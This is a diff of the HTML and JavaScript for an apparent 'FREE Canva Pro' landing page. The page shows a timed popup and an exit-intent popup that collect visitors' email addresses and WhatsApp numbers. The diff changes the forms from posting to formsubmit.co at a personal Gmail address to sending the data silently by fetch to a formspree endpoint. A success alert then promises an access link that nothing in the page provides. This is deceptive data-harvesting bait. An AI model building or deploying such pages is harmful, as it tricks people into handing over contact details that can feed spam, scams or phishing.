@@ -711,145 +711,169 @@
         </div>
     </footer>
 
-    <!-- Popup for Free Canva Pro -->
-    <div class="popup" id="popup">
-        <div class="popup-content">
-            <span class="popup-close" onclick="closePopup()">&times;</span>
-            <h3>🎁 Get FREE Canva Pro Access!</h3>
-            <p style="margin-bottom: 20px;">Drop your details and you will get access instantly</p>
-            
-            <form class="popup-form" target="_blank" action="https://formsubmit.co/Skyq432@gmail.com" method="POST" >
-                <input type="email" name="email" placeholder="Enter your email address" required />
-                <input type="tel" name="telephone" placeholder="Enter your WhatsApp number" required />
-                <button type="submit">Get Free Canva Pro Now!</button>
-            </form>
-        </div>
-    </div>
+   <!-- Popup for Free Canva Pro -->
+<div class="popup" id="popup">
+  <div class="popup-content">
+    <span class="popup-close" onclick="closePopup()">&times;</span>
+    <h3>🎁 Get FREE Canva Pro Access!</h3>
+    <p style="margin-bottom: 20px;">Drop your details and you will get access instantly</p>
 
-    <!-- Exit Intent Popup -->
-    <div class="popup" id="exitPopup">
-        <div class="popup-content">
-            <span class="popup-close" onclick="closeExitPopup()">&times;</span>
-            <h3>🚨 Wait! Don't Leave Without This!</h3>
-            <p style="margin-bottom: 20px;">Get <strong>FREE Canva Pro Access</strong> before you go!</p>
-            
-            <form class="popup-form" target="_blank" action="https://formsubmit.co/Skyq432@gmail.com" method="POST" >
-                <input type="email" name="email" placeholder="Enter your email address" required />
-                <input type="tel" name="telephone" placeholder="Enter your WhatsApp number" required />
-                <button type="submit">Claim My Free Canva Pro!</button>
-            </form>
-        </div>
-    </div>
+    <form class="popup-form" id="mainForm">
+      <input type="email" name="email" placeholder="Enter your email address" required />
+      <input type="tel" name="telephone" placeholder="Enter your WhatsApp number" required />
+      <button type="submit">Get Free Canva Pro Now!</button>
+    </form>
+  </div>
+</div>
 
-    <script>
-        // Countdown Timer
-        let countdownTime = 5 * 60 * 60; // 5 hours in seconds
-        
-        function updateCountdown() {
-            const hours = Math.floor(countdownTime / 3600);
-            const minutes = Math.floor((countdownTime % 3600) / 60);
-            const seconds = countdownTime % 60;
-            
-            document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
-            document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
-            document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
-            
-            if (countdownTime > 0) {
-                countdownTime--;
-            }
-        }
-        
-        setInterval(updateCountdown, 1000);
-        updateCountdown();
-        
-        // Testimonial Slider
-        let currentTestimonial = 0;
-        const testimonials = document.querySelectorAll('.testimonial-slide');
-        const dots = document.querySelectorAll('.slider-dot');
-        
-        function showTestimonial(n) {
-            testimonials.forEach(slide => slide.classList.remove('active'));
-            dots.forEach(dot => dot.classList.remove('active'));
-            
-            testimonials[n].classList.add('active');
-            dots[n].classList.add('active');
-        }
-        
-        function currentSlide(n) {
-            currentTestimonial = n - 1;
-            showTestimonial(currentTestimonial);
-        }
-        
-        function nextTestimonial() {
-            currentTestimonial = (currentTestimonial + 1) % testimonials.length;
-            showTestimonial(currentTestimonial);
-        }
-        
-        setInterval(nextTestimonial, 5000);
-        
-        // Popup Functions
-        function showPopup() {
-            document.getElementById('popup').classList.add('active');
-        }
-        
-        function closePopup() {
-            document.getElementById('popup').classList.remove('active');
-        }
-        
-        function submitForm(e) {
-            e.preventDefault();
-            alert('Thank you! Check your WhatsApp for your FREE Canva Pro access link!');
-            closePopup();
-        }
-        
-        // Exit Intent Popup
-        let exitPopupShown = false;
-        
-        function showExitPopup() {
-            if (!exitPopupShown) {
-                document.getElementById('exitPopup').classList.add('active');
-                exitPopupShown = true;
-            }
-        }
-        
-        function closeExitPopup() {
-            document.getElementById('exitPopup').classList.remove('active');
-        }
-        
-        function submitExitForm(e) {
-            e.preventDefault();
-            alert('Thank you! Check your WhatsApp for your FREE Canva Pro access link!');
-            closeExitPopup();
-        }
-        
-        // Show popup after 3 seconds
-        setTimeout(showPopup, 3000);
-        
-        // Exit intent detection
-        document.addEventListener('mouseleave', function(e) {
-            if (e.clientY <= 0) {
-                showExitPopup();
-            }
-        });
-        
-        // Mobile exit intent (scroll to top)
-        let lastScrollY = window.scrollY;
-        window.addEventListener('scroll', function() {
-            if (window.scrollY < lastScrollY && window.scrollY < 100) {
-                showExitPopup();
-            }
-            lastScrollY = window.scrollY;
-        });
-        
-        // Smooth scrolling for anchor links
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                document.querySelector(this.getAttribute('href')).scrollIntoView({
-                    behavior: 'smooth'
-                });
-            });
-        });
-    </script>
+<!-- Exit Intent Popup -->
+<div class="popup" id="exitPopup">
+  <div class="popup-content">
+    <span class="popup-close" onclick="closeExitPopup()">&times;</span>
+    <h3>🚨 Wait! Don't Leave Without This!</h3>
+    <p style="margin-bottom: 20px;">Get <strong>FREE Canva Pro Access</strong> before you go!</p>
+
+    <form class="popup-form" id="exitForm">
+      <input type="email" name="email" placeholder="Enter your email address" required />
+      <input type="tel" name="telephone" placeholder="Enter your WhatsApp number" required />
+      <button type="submit">Claim My Free Canva Pro!</button>
+    </form>
+  </div>
+</div>
+
+<script>
+  // Check if form has already been submitted
+  const formSubmitted = localStorage.getItem('formSubmitted') === 'true';
+
+  function closePopup() {
+    document.getElementById('popup').classList.remove('active');
+  }
+
+  function closeExitPopup() {
+    document.getElementById('exitPopup').classList.remove('active');
+  }
+
+  // Submit form via AJAX and prevent redirect
+  async function handleFormSubmit(event, formId) {
+    event.preventDefault();
+
+    const form = document.getElementById(formId);
+    const formData = new FormData(form);
+    const email = formData.get("email");
+    const telephone = formData.get("telephone");
+
+    try {
+      await fetch("https://formspree.io/f/xeozorde", {
+        method: "POST",
+        headers: { "Accept": "application/json" },
+        body: formData
+      });
+
+      alert("✅ Thank you! Check your WhatsApp for your FREE Canva Pro access link!");
+
+      // Hide both popups and prevent them from appearing again
+      localStorage.setItem("formSubmitted", "true");
+      closePopup();
+      closeExitPopup();
+    } catch (err) {
+      alert("❌ Oops! Something went wrong. Please try again.");
+    }
+  }
+
+  if (!formSubmitted) {
+    // Show popup after 3 seconds
+    setTimeout(() => {
+      document.getElementById("popup").classList.add("active");
+    }, 3000);
+
+    // Exit intent for desktop
+    let exitPopupShown = false;
+    document.addEventListener("mouseleave", (e) => {
+      if (e.clientY <= 0 && !exitPopupShown) {
+        document.getElementById("exitPopup").classList.add("active");
+        exitPopupShown = true;
+      }
+    });
+
+    // Mobile exit intent
+    let lastScrollY = window.scrollY;
+    window.addEventListener("scroll", () => {
+      if (window.scrollY < lastScrollY && window.scrollY < 100 && !exitPopupShown) {
+        document.getElementById("exitPopup").classList.add("active");
+        exitPopupShown = true;
+      }
+      lastScrollY = window.scrollY;
+    });
+  }
+
+  // Attach form handlers
+  document.getElementById("mainForm").addEventListener("submit", (e) => handleFormSubmit(e, "mainForm"));
+  document.getElementById("exitForm").addEventListener("submit", (e) => handleFormSubmit(e, "exitForm"));
+
+  // Smooth scrolling for anchor links
+  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+    anchor.addEventListener('click', function (e) {
+      e.preventDefault();
+      document.querySelector(this.getAttribute('href')).scrollIntoView({
+        behavior: 'smooth'
+      });
+    });
+  });
+</script>
+
+<style>
+  .popup {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background-color: rgba(0,0,0,0.7);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .popup.active {
+    display: flex;
+  }
+
+  .popup-content {
+    background: white;
+    padding: 20px;
+    max-width: 400px;
+    width: 90%;
+    border-radius: 10px;
+    position: relative;
+    text-align: center;
+  }
+
+  .popup-close {
+    position: absolute;
+    top: 10px; right: 15px;
+    font-size: 20px;
+    cursor: pointer;
+  }
+
+  .popup-form input {
+    width: 90%;
+    margin: 10px 0;
+    padding: 10px;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+  }
+
+  .popup-form button {
+    background: #00aaff;
+    color: white;
+    padding: 10px 15px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+
+  .popup-form button:hover {
+    background: #0088cc;
+  }
+</style>
 </body>
 </html>
